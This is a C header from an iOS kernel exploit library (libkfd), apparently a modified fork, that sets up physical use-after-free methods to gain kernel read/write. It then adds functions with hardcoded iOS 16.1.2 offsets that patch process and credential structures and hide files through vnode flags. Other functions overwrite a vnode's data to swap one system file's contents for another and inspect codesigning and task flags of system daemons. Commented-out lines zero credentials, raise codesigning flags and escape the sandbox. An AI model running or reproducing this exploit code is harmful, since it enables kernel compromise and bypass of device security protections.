/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef libkfd_h
#define libkfd_h

/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

#include "libkfd/common.h"

/*
 * The public API of libkfd.
 */

enum puaf_method {
    puaf_physpuppet,
    puaf_smith,
};

enum kread_method {
    kread_kqueue_workloop_ctl,
    kread_sem_open,
};

enum kwrite_method {
    kwrite_dup,
    kwrite_sem_open,
};

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method);
void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size);
void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size);
void kclose(u64 kfd);

/*
 * The private API of libkfd.
 */

struct kfd; // Forward declaration for function pointers.

struct info {
    struct {
        vm_address_t src_uaddr;
        vm_address_t dst_uaddr;
        vm_size_t size;
    } copy;
    struct {
        i32 pid;
        u64 tid;
        u64 vid;
        bool ios;
        char osversion[8];
        u64 maxfilesperproc;
    } env;
    struct {
        u64 current_map;
        u64 current_pmap;
        u64 current_proc;
        u64 current_task;
        u64 current_thread;
        u64 current_uthread;
        u64 kernel_map;
        u64 kernel_pmap;
        u64 kernel_proc;
        u64 kernel_task;
    } kaddr;
};

struct perf {
    u64 kernelcache_index;
    u64 kernel_slide;
    u64 gVirtBase;
    u64 gPhysBase;
    u64 gPhysSize;
    struct {
        u64 pa;
        u64 va;
    } ttbr[2];
    struct ptov_table_entry {
        u64 pa;
        u64 va;
        u64 len;
    } ptov_table[8];
    struct {
        u64 kaddr;
        u64 paddr;
        u64 uaddr;
        u64 size;
    } shared_page;
    struct {
        i32 fd;
        u32 si_rdev_buffer[2];
        u64 si_rdev_kaddr;
    } dev;
    void (*saved_kread)(struct kfd*, u64, void*, u64);
    void (*saved_kwrite)(struct kfd*, void*, u64, u64);
};

struct puaf {
    u64 number_of_puaf_pages;
    u64* puaf_pages_uaddr;
    void* puaf_method_data;
    u64 puaf_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*run)(struct kfd*);
        void (*cleanup)(struct kfd*);
        void (*free)(struct kfd*);
    } puaf_method_ops;
};

struct krkw {
    u64 krkw_maximum_id;
    u64 krkw_allocated_id;
    u64 krkw_searched_id;
    u64 krkw_object_id;
    u64 krkw_object_uaddr;
    u64 krkw_object_size;
    void* krkw_method_data;
    u64 krkw_method_data_size;
    struct {
        void (*init)(struct kfd*);
        void (*allocate)(struct kfd*, u64);
        bool (*search)(struct kfd*, u64);
        void (*kread)(struct kfd*, u64, void*, u64);
        void (*kwrite)(struct kfd*, void*, u64, u64);
        void (*find_proc)(struct kfd*);
        void (*deallocate)(struct kfd*, u64);
        void (*free)(struct kfd*);
    } krkw_method_ops;
};

struct kfd {
    struct info info;
    struct perf perf;
    struct puaf puaf;
    struct krkw kread;
    struct krkw kwrite;
};

#include "libkfd/info.h"
#include "libkfd/puaf.h"
#include "libkfd/krkw.h"
#include "libkfd/perf.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

uint8_t kread8(u64 kfd, uint64_t where) {
    uint8_t out;
    kread(kfd, where, &out, sizeof(uint8_t));
    return out;
}
uint32_t kread32(u64 kfd, uint64_t where) {
    uint32_t out;
    kread(kfd, where, &out, sizeof(uint32_t));
    return out;
}
uint64_t kread64(u64 kfd, uint64_t where) {
    uint64_t out;
    kread(kfd, where, &out, sizeof(uint64_t));
    return out;
}

void kwrite8(u64 kfd, uint64_t where, uint8_t what) {
    uint8_t _buf[8] = {};
    _buf[0] = what;
    _buf[1] = kread8(kfd, where+1);
    _buf[2] = kread8(kfd, where+2);
    _buf[3] = kread8(kfd, where+3);
    _buf[4] = kread8(kfd, where+4);
    _buf[5] = kread8(kfd, where+5);
    _buf[6] = kread8(kfd, where+6);
    _buf[7] = kread8(kfd, where+7);
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}
void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
    u32 _buf[2] = {};
    _buf[0] = what;
    _buf[1] = kread32(kfd, where+4);
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}
void kwrite64(u64 kfd, uint64_t where, uint64_t what) {
    u64 _buf[1] = {};
    _buf[0] = what;
    kwrite((u64)(kfd), &_buf, where, sizeof(u64));
}

uint64_t getProc(u64 kfd, pid_t pid) {
    uint64_t proc = ((struct kfd*)kfd)->info.kaddr.kernel_proc;
    
    while (true) {
        if(kread32(kfd, proc + 0x60/*PROC_P_PID_OFF*/) == pid) {
            return proc;
        }
        proc = kread64(kfd, proc + 0x8/*PROC_P_LIST_LE_PREV_OFF*/);
    }
    
    return 0;
}

uint64_t getProcByName(u64 kfd, char* nm) {
    uint64_t proc = ((struct kfd*)kfd)->info.kaddr.kernel_proc;
    
    while (true) {
        uint64_t nameptr = proc + 0x381;//PROC_P_NAME_OFF;
        char name[32];
        kread(kfd, nameptr, &name, 32);
//        printf("[i] pid: %d, process name: %s\n", kread32(kfd, proc + 0x60), name);
        if(strcmp(name, nm) == 0) {
            return proc;
        }
        proc = kread64(kfd, proc + 0x8);//PROC_P_LIST_LE_PREV_OFF);
    }
    
    return 0;
}

int getPidByName(u64 kfd, char* nm) {
    return kread32(kfd, getProcByName(kfd, nm) + 0x60);//PROC_P_PID_OFF);
}

int funProc(u64 kfd, uint64_t proc) {
    int p_ppid = kread32(kfd, proc + 0x20);
    printf("[i] self proc->p_ppid: %d\n", p_ppid);
    printf("[i] Patching proc->p_ppid %d -> 1 (for testing kwrite32)\n", p_ppid);
    kwrite32(kfd, proc + 0x20, 0x1);
    printf("getppid(): %u\n", getppid());
    kwrite32(kfd, proc + 0x20, p_ppid);

    int p_original_ppid = kread32(kfd, proc + 0x24);
    printf("[i] self proc->p_original_ppid: %d\n", p_original_ppid);
    
    int p_pgrpid = kread32(kfd, proc + 0x28);
    printf("[i] self proc->p_pgrpid: %d\n", p_pgrpid);
    
    int p_uid = kread32(kfd, proc + 0x2c);
    printf("[i] self proc->p_uid: %d\n", p_uid);
    
    int p_gid = kread32(kfd, proc + 0x30);
    printf("[i] self proc->p_gid: %d\n", p_gid);
    
    int p_ruid = kread32(kfd, proc + 0x34);
    printf("[i] self proc->p_ruid: %d\n", p_ruid);
    
    int p_rgid = kread32(kfd, proc + 0x38);
    printf("[i] self proc->p_rgid: %d\n", p_rgid);
    
    int p_svuid = kread32(kfd, proc + 0x3c);
    printf("[i] self proc->p_svuid: %d\n", p_svuid);
    
    int p_svgid = kread32(kfd, proc + 0x40);
    printf("[i] self proc->p_svgid: %d\n", p_svgid);
    
    int p_sessionid = kread32(kfd, proc + 0x44);
    printf("[i] self proc->p_sessionid: %d\n", p_sessionid);
    
    uint64_t p_puniqueid = kread64(kfd, proc + 0x48);
    printf("[i] self proc->p_puniqueid: 0x%llx\n", p_puniqueid);
    
    printf("[i] Patching proc->p_puniqueid 0x%llx -> 0x4142434445464748 (for testing kwrite64)\n", p_puniqueid);
    kwrite64(kfd, proc+0x48, 0x4142434445464748);
    printf("[i] self proc->p_puniqueid: 0x%llx\n", kread64(kfd, proc + 0x48));
    kwrite64(kfd, proc+0x48, p_puniqueid);
    
    return 0;
}

int funUcred(u64 kfd, uint64_t proc) {
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    uint64_t ucreds = kread64(kfd, proc_ro + 0x20);
    
    uint64_t cr_label_pac = kread64(kfd, ucreds + 0x78);
    uint64_t cr_label = cr_label_pac | 0xffffff8000000000;
    printf("[i] self ucred->cr_label: 0x%llx\n", cr_label);
    
    uint64_t cr_posix_p = ucreds + 0x18;
    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
    printf("[i] self ucred->posix_cred->cr_ruid: %u\n", kread32(kfd, cr_posix_p + 4));
    printf("[i] self ucred->posix_cred->cr_svuid: %u\n", kread32(kfd, cr_posix_p + 8));
    printf("[i] self ucred->posix_cred->cr_ngroups: %u\n", kread32(kfd, cr_posix_p + 0xc));
    printf("[i] self ucred->posix_cred->cr_groups: %u\n", kread32(kfd, cr_posix_p + 0x10));
    printf("[i] self ucred->posix_cred->cr_rgid: %u\n", kread32(kfd, cr_posix_p + 0x50));
    printf("[i] self ucred->posix_cred->cr_svgid: %u\n", kread32(kfd, cr_posix_p + 0x54));
    printf("[i] self ucred->posix_cred->cr_gmuid: %u\n", kread32(kfd, cr_posix_p + 0x58));
    printf("[i] self ucred->posix_cred->cr_flags: %u\n", kread32(kfd, cr_posix_p + 0x5c));
    
//    sleep(3);
//    kwrite32(kfd, cr_posix_p+0, 501);
//    printf("[i] self ucred->posix_cred->cr_uid: %u\n", kread32(kfd, cr_posix_p + 0));
    
//    kwrite64(kfd, cr_posix_p+0, 0);
//    kwrite64(kfd, cr_posix_p+8, 0);
//    kwrite64(kfd, cr_posix_p+16, 0);
//    kwrite64(kfd, cr_posix_p+24, 0);
//    kwrite64(kfd, cr_posix_p+32, 0);
//    kwrite64(kfd, cr_posix_p+40, 0);
//    kwrite64(kfd, cr_posix_p+48, 0);
//    kwrite64(kfd, cr_posix_p+56, 0);
//    kwrite64(kfd, cr_posix_p+64, 0);
//    kwrite64(kfd, cr_posix_p+72, 0);
//    kwrite64(kfd, cr_posix_p+80, 0);
//    kwrite64(kfd, cr_posix_p+88, 0);
    
//    setgroups(0, 0);
    return 0;
}

uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    
    int file_index = open(filename, O_RDONLY);
    if (file_index == -1) return -1;
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] vnode: 0x%llx\n", vnode);
    
    //vnode_ref, vnode_get
    uint32_t usecount = kread32(kfd, vnode + off_vnode_usecount);
    uint32_t iocount = kread32(kfd, vnode + off_vnode_iocount);
    printf("[i] vnode->usecount: %d, vnode->iocount: %d\n", usecount, iocount);
    kwrite32(kfd, vnode + off_vnode_usecount, usecount + 1);
    kwrite32(kfd, vnode + off_vnode_iocount, iocount + 1);
    
#define VISSHADOW 0x008000
    //hide file
    uint32_t v_flags = kread32(kfd, vnode + off_vnode_vflags);
    printf("[i] vnode->v_flags: 0x%x\n", v_flags);
    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags | VISSHADOW));

    //exist test (should not be exist
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    //show file
    v_flags = kread32(kfd, vnode + off_vnode_vflags);
    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags &= ~VISSHADOW));
    
    printf("[i] %s access ret: %d\n", filename, access(filename, F_OK));
    
    close(file_index);
    
    //restore vnode iocount, usecount
    usecount = kread32(kfd, vnode + off_vnode_usecount);
    iocount = kread32(kfd, vnode + off_vnode_iocount);
    if(usecount > 0)
        kwrite32(kfd, vnode + off_vnode_usecount, usecount - 1);
    if(iocount > 0)
        kwrite32(kfd, vnode + off_vnode_iocount, iocount - 1);

    return 0;
}

uint64_t funVnodeOverwrite(u64 kfd, uint64_t proc, char* to, char* from) {
    //16.1.2 offsets
    uint32_t off_p_pfd = 0xf8;
    uint32_t off_fd_ofiles = 0;
    uint32_t off_fp_fglob = 0x10;
    uint32_t off_fg_data = 0x38;
    uint32_t off_vnode_iocount = 0x64;
    uint32_t off_vnode_usecount = 0x60;
    uint32_t off_vnode_vflags = 0x54;
    uint32_t off_vnode_v_mount = 0xd8;
    uint32_t off_vnode_v_data = 0xe0;
    uint32_t off_vnode_v_kusecount = 0x5c;
    uint32_t off_vnode_v_references = 0x5b;
    uint32_t off_vnode_v_parent = 0xc0;
    
    int file_index = open(to, O_RDONLY);
    if (file_index == -1) return -1;
    
    //get vnode
    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t to_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode: 0x%llx\n", to, to_vnode);
    
    uint64_t to_v_mount_pac = kread64(kfd, to_vnode + off_vnode_v_mount);
    uint64_t to_v_mount = to_v_mount_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_mount: 0x%llx\n", to, to_v_mount);
    uint64_t to_v_data = kread64(kfd, to_vnode + off_vnode_v_data);
    printf("[i] %s to_vnode->v_data: 0x%llx\n", from, to_v_data);
    
    uint8_t to_v_references = kread8(kfd, to_vnode + off_vnode_v_references);
    printf("[i] %s to_vnode->v_references: %d\n", to, to_v_references);
    uint32_t to_usecount = kread32(kfd, to_vnode + off_vnode_usecount);
    printf("[i] %s to_vnode->usecount: %d\n", to, to_usecount);
    uint32_t to_iocount = kread32(kfd, to_vnode + off_vnode_iocount);
    printf("[i] %s to_vnode->iocount: %d\n", to, to_iocount);
    uint32_t to_v_kusecount = kread32(kfd, to_vnode + off_vnode_v_kusecount);
    printf("[i] %s to_vnode->kusecount: %d\n", to, to_v_kusecount);
    uint64_t to_v_parent_pac = kread64(kfd, to_vnode + off_vnode_v_parent);
    uint64_t to_v_parent = to_v_parent_pac | 0xffffff8000000000;
    printf("[i] %s to_vnode->v_parent: 0x%llx\n", to, to_v_parent);
    uint64_t to_v_freelist_tqe_next = kread64(kfd, to_vnode + 0x10); //v_freelist.tqe_next
    printf("[i] %s to_vnode->v_freelist.tqe_next: 0x%llx\n", to, to_v_freelist_tqe_next);
    uint64_t to_v_freelist_tqe_prev = kread64(kfd, to_vnode + 0x18); //v_freelist.tqe_prev
    printf("[i] %s to_vnode->v_freelist.tqe_prev: 0x%llx\n", to, to_v_freelist_tqe_prev);
    uint64_t to_v_mntvnodes_tqe_next = kread64(kfd, to_vnode + 0x20);   //v_mntvnodes.tqe_next
    printf("[i] %s to_vnode->v_mntvnodes.tqe_next: 0x%llx\n", to, to_v_mntvnodes_tqe_next);
    uint64_t to_v_mntvnodes_tqe_prev = kread64(kfd, to_vnode + 0x28);  //v_mntvnodes.tqe_prev
    printf("[i] %s to_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", to, to_v_mntvnodes_tqe_prev);
    uint64_t to_v_ncchildren_tqh_first = kread64(kfd, to_vnode + 0x30);
    printf("[i] %s to_vnode->v_ncchildren.tqh_first: 0x%llx\n", to, to_v_ncchildren_tqh_first);
    uint64_t to_v_ncchildren_tqh_last = kread64(kfd, to_vnode + 0x38);
    printf("[i] %s to_vnode->v_ncchildren.tqh_last: 0x%llx\n", to, to_v_ncchildren_tqh_last);
    uint64_t to_v_nclinks_lh_first = kread64(kfd, to_vnode + 0x40);
    printf("[i] %s to_vnode->v_nclinks.lh_first: 0x%llx\n", to, to_v_nclinks_lh_first);
    uint64_t to_v_defer_reclaimlist = kread64(kfd, to_vnode + 0x48);    //v_defer_reclaimlist
    printf("[i] %s to_vnode->v_defer_reclaimlist: 0x%llx\n", to, to_v_defer_reclaimlist);
    uint32_t to_v_listflag = kread32(kfd, to_vnode + 0x50);    //v_listflag
    printf("[i] %s to_vnode->v_listflag: 0x%x\n", to, to_v_listflag);
    
    close(file_index);
    
    file_index = open(from, O_RDONLY);
    if (file_index == -1) return -1;
    
    //get vnode
    filedesc_pac = kread64(kfd, proc + off_p_pfd);
    filedesc = filedesc_pac | 0xffffff8000000000;
    openedfile = kread64(kfd, filedesc + (8 * file_index));
    fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
    fileglob = fileglob_pac | 0xffffff8000000000;
    vnode_pac = kread64(kfd, fileglob + off_fg_data);
    uint64_t from_vnode = vnode_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode: 0x%llx\n", from, from_vnode);
    
    uint64_t from_v_mount_pac = kread64(kfd, from_vnode + off_vnode_v_mount);
    uint64_t from_v_mount = from_v_mount_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_mount: 0x%llx\n", from, from_v_mount);
    uint64_t from_v_data = kread64(kfd, from_vnode + off_vnode_v_data);
    printf("[i] %s from_vnode->v_data: 0x%llx\n", from, from_v_data);
    uint8_t from_v_references = kread8(kfd, from_vnode + off_vnode_v_references);
    printf("[i] %s from_vnode->v_references: %d\n", from, from_v_references);
    uint32_t from_usecount = kread32(kfd, from_vnode + off_vnode_usecount);
    printf("[i] %s from_vnode->usecount: %d\n", from, from_usecount);
    uint32_t from_iocount = kread32(kfd, from_vnode + off_vnode_iocount);
    printf("[i] %s from_vnode->iocount: %d\n", from, from_iocount);
    uint32_t from_v_kusecount = kread32(kfd, from_vnode + off_vnode_v_kusecount);
    printf("[i] %s from_vnode->kusecount: %d\n", from, from_v_kusecount);
    uint64_t from_v_parent_pac = kread64(kfd, from_vnode + off_vnode_v_parent);
    uint64_t from_v_parent = from_v_parent_pac | 0xffffff8000000000;
    printf("[i] %s from_vnode->v_parent: 0x%llx\n", from, from_v_parent);
    uint64_t from_v_freelist_tqe_next = kread64(kfd, from_vnode + 0x10); //v_freelist.tqe_next
    printf("[i] %s from_vnode->v_freelist.tqe_next: 0x%llx\n", from, from_v_freelist_tqe_next);
    uint64_t from_v_freelist_tqe_prev = kread64(kfd, from_vnode + 0x18); //v_freelist.tqe_prev
    printf("[i] %s from_vnode->v_freelist.tqe_prev: 0x%llx\n", from, from_v_freelist_tqe_prev);
    uint64_t from_v_mntvnodes_tqe_next = kread64(kfd, from_vnode + 0x20);   //v_mntvnodes.tqe_next
    printf("[i] %s from_vnode->v_mntvnodes.tqe_next: 0x%llx\n", from, from_v_mntvnodes_tqe_next);
    uint64_t from_v_mntvnodes_tqe_prev = kread64(kfd, from_vnode + 0x28);  //v_mntvnodes.tqe_prev
    printf("[i] %s from_vnode->v_mntvnodes.tqe_prev: 0x%llx\n", from, from_v_mntvnodes_tqe_prev);
    uint64_t from_v_ncchildren_tqh_first = kread64(kfd, from_vnode + 0x30);
    printf("[i] %s from_vnode->v_ncchildren.tqh_first: 0x%llx\n", from, from_v_ncchildren_tqh_first);
    uint64_t from_v_ncchildren_tqh_last = kread64(kfd, from_vnode + 0x38);
    printf("[i] %s from_vnode->v_ncchildren.tqh_last: 0x%llx\n", from, from_v_ncchildren_tqh_last);
    uint64_t from_v_nclinks_lh_first = kread64(kfd, from_vnode + 0x40);
    printf("[i] %s from_vnode->v_nclinks.lh_first: 0x%llx\n", from, from_v_nclinks_lh_first);
    uint64_t from_v_defer_reclaimlist = kread64(kfd, from_vnode + 0x48);    //v_defer_reclaimlist
    printf("[i] %s from_vnode->v_defer_reclaimlist: 0x%llx\n", from, from_v_defer_reclaimlist);
    uint32_t from_v_listflag = kread32(kfd, from_vnode + 0x50);    //v_listflag
    printf("[i] %s from_vnode->v_listflag: 0x%x\n", from, from_v_listflag);
    
    
    
//    sleep(2);
    kwrite64(kfd, to_vnode + off_vnode_v_data, from_v_data);
//    kwrite32(kfd, to_vnode + off_vnode_iocount, to_iocount + 1);
    
    kwrite32(kfd, to_vnode + off_vnode_usecount, from_usecount + 1);
    kwrite32(kfd, to_vnode + off_vnode_v_kusecount, from_v_kusecount + 1);
    kwrite8(kfd, to_vnode + off_vnode_v_references, from_v_references + 1);
    
//    kwrite64(kfd, to_vnode + 0x10, from_v_freelist_tqe_next);
//    kwrite64(kfd, to_vnode + 0x18, from_v_freelist_tqe_prev);
//    kwrite64(kfd, to_vnode + 0x20, from_v_mntvnodes_tqe_next);
//    kwrite64(kfd, to_vnode + 0x28, from_v_mntvnodes_tqe_prev);
//    kwrite64(kfd, to_vnode + 0x30, from_v_ncchildren_tqh_first);
//    kwrite64(kfd, to_vnode + 0x38, from_v_ncchildren_tqh_last);
//    kwrite64(kfd, to_vnode + 0x40, from_v_nclinks_lh_first);

    return 0;
}

int funCSFlags(u64 kfd, char* process) {
    uint64_t pid = getPidByName(kfd, process);
    uint64_t proc = getProc(kfd, pid);
    
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    uint32_t csflags = kread32(kfd, proc_ro + 0x1C);
    printf("[i] %s proc->proc_ro->csflags: 0x%x\n", process, csflags);
    
#define TF_PLATFORM 0x400

#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER        0x0000008    /* has installer entitlement */

#define    CS_HARD            0x0000100    /* don't load invalid pages */
#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */

#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */

#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
    
//    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
//    sleep(3);
//    kwrite32(kfd, proc_ro + 0x1c, csflags);
    
    return 0;
}

int funTask(u64 kfd, char* process) {
    uint64_t pid = getPidByName(kfd, process);
    uint64_t proc = getProc(kfd, pid);
    printf("[i] %s proc: 0x%llx\n", process, proc);
    uint64_t proc_ro = kread64(kfd, proc + 0x18);
    
    uint64_t pr_proc = kread64(kfd, proc_ro + 0x0);
    printf("[i] %s proc->proc_ro->pr_proc: 0x%llx\n", process, pr_proc);
    
    uint64_t pr_task = kread64(kfd, proc_ro + 0x8);
    printf("[i] %s proc->proc_ro->pr_task: 0x%llx\n", process, pr_task);
    
    //proc_is64bit_data+0x18: LDR             W8, [X8,#0x3D0]
    uint32_t t_flags = kread32(kfd, pr_task + 0x3D0);
    printf("[i] %s task->t_flags: 0x%x\n", process, t_flags);
    
    
    /*
     * RO-protected flags:
     */
    #define TFRO_PLATFORM                   0x00000400                      /* task is a platform binary */
    #define TFRO_FILTER_MSG                 0x00004000                      /* task calls into message filter callback before sending a message */
    #define TFRO_PAC_EXC_FATAL              0x00010000                      /* task is marked a corpse if a PAC exception occurs */
    #define TFRO_PAC_ENFORCE_USER_STATE     0x01000000                      /* Enforce user and kernel signed thread state */
    uint32_t t_flags_ro = kread64(kfd, proc_ro + 0x78);
    printf("[i] %s proc->proc_ro->t_flags_ro: 0x%x\n", process, t_flags_ro);
    
    return 0;
}


u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_smith);
    assert(kread_method <= kread_sem_open);
    assert(kwrite_method <= kwrite_sem_open);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    krkw_run(kfd);
    info_run(kfd);
    perf_run(kfd);
    
    uint64_t kslide = kfd->perf.kernel_slide;
    uint64_t kbase = 0xfffffff007004000 + kslide;
    printf("[i] Kernel base: 0x%llx\n", kbase);
    printf("[i] Kernel slide: 0x%llx\n", kslide);
    uint64_t kheader64 = kread64(kfd, kbase);
    printf("[i] Kernel base kread64 ret: 0x%llx\n", kheader64);
    
    pid_t myPid = getpid();
    uint64_t selfProc = getProc(kfd, myPid);
    printf("[i] self proc: 0x%llx\n", selfProc);
    
    funUcred(kfd, selfProc);
    funProc(kfd, selfProc);
    funVnode(kfd, selfProc, "/System/Library/Audio/UISounds/photoShutter.caf");
    funCSFlags(kfd, "launchd");

    funTask(kfd, "launchd");
    funTask(kfd, "kfd");
    funTask(kfd, "SpringBoard");
    funTask(kfd, "amfid");
    funVnodeOverwrite(kfd, selfProc, "/System/Library/AppPlaceholders/Stocks.app/AppIcon60x60@2x.png", "/System/Library/AppPlaceholders/Tips.app/AppIcon60x60@2x.png");

//    printf("UID: %d\n", getuid());
    
//    escapeSandboxForProcess(kfd, selfProc);
    
    puaf_cleanup(kfd);

    timer_end();
    return (u64)(kfd);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

#endif /* libkfd_h */
